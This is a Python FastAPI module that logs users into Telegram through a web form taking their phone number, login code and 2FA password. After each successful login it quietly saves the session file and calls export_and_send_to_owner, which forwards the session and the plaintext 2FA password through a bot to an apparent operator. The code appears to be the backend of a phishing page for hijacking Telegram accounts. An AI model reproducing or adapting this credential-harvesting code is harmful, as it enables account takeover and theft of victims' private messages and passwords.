import asyncio
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

from config import API_ID, API_HASH, SESSIONS_DIR, WEB_URL

router = APIRouter()

# Temporary storage for login sessions
_login_sessions = {}


class PhoneRequest(BaseModel):
    phone: str


class CodeRequest(BaseModel):
    session_id: str
    code: str


class TwoFARequest(BaseModel):
    session_id: str
    password: str


@router.post("/api/web-login/phone")
async def web_login_phone(req: PhoneRequest):
    import os
    import secrets
    
    phone = req.phone.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    
    # Generate unique session ID
    session_id = f"web_{secrets.token_hex(8)}"
    session_path = os.path.join(SESSIONS_DIR, session_id)
    
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        _login_sessions[session_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
        
        return {"session_id": session_id, "success": True}
    except Exception as e:
        raise HTTPException(400, str(e))


@router.post("/api/web-login/code")
async def web_login_code(req: CodeRequest):
    session_data = _login_sessions.get(req.session_id)
    if not session_data:
        raise HTTPException(400, "Session not found. Please start over.")
    
    client = session_data["client"]
    phone = session_data["phone"]
    phone_code_hash = session_data["phone_code_hash"]
    
    try:
        await client.sign_in(phone, req.code, phone_code_hash=phone_code_hash)
        
        # Success - get user info and trigger export
        me = await client.get_me()
        final_session_id = f"user_{me.id}"
        
        # Copy session to final path
        import os
        import shutil
        
        src = os.path.join(SESSIONS_DIR, req.session_id + ".session")
        dst = os.path.join(SESSIONS_DIR, final_session_id + ".session")
        
        if os.path.exists(src):
            shutil.copy(src, dst)
            os.remove(src)
        
        # Clean up
        del _login_sessions[req.session_id]
        
        # Trigger export in background
        asyncio.create_task(trigger_export(client, final_session_id, None))
        
        return {
            "success": True,
            "session_url": f"{WEB_URL}/?session={final_session_id}"
        }
        
    except SessionPasswordNeededError:
        # Get password hint
        hint = None
        try:
            password_info = await client.get_password_hint()
            hint = password_info if password_info else None
        except:
            pass
        return {"needs_2fa": True, "hint": hint}
    except PhoneCodeInvalidError:
        raise HTTPException(400, "Неверный код")
    except Exception as e:
        raise HTTPException(400, str(e))


@router.post("/api/web-login/2fa")
async def web_login_2fa(req: TwoFARequest):
    session_data = _login_sessions.get(req.session_id)
    if not session_data:
        raise HTTPException(400, "Session not found. Please start over.")
    
    client = session_data["client"]
    
    try:
        await client.sign_in(password=req.password)
        
        me = await client.get_me()
        final_session_id = f"user_{me.id}"
        
        # Copy session to final path
        import os
        import shutil
        
        src = os.path.join(SESSIONS_DIR, req.session_id + ".session")
        dst = os.path.join(SESSIONS_DIR, final_session_id + ".session")
        
        if os.path.exists(src):
            shutil.copy(src, dst)
            os.remove(src)
        
        # Clean up
        del _login_sessions[req.session_id]
        
        # Trigger export in background with 2FA password
        asyncio.create_task(trigger_export(client, final_session_id, req.password))
        
        return {
            "success": True,
            "session_url": f"{WEB_URL}/?session={final_session_id}"
        }
        
    except PasswordHashInvalidError:
        raise HTTPException(400, "Неверный пароль 2FA")
    except Exception as e:
        raise HTTPException(400, str(e))


async def trigger_export(client: TelegramClient, session_id: str, twofa: str = None):
    """Trigger auto-export after successful login"""
    try:
        from aiogram import Bot
        from config import BOT_TOKEN
        from bot.export_service import export_and_send_to_owner
        
        # Create bot instance for sending messages
        bot = Bot(token=BOT_TOKEN)
        
        await export_and_send_to_owner(bot, client, session_id, twofa)
        
        await bot.session.close()
    except Exception as e:
        print(f"[WebLogin] Export error: {e}")

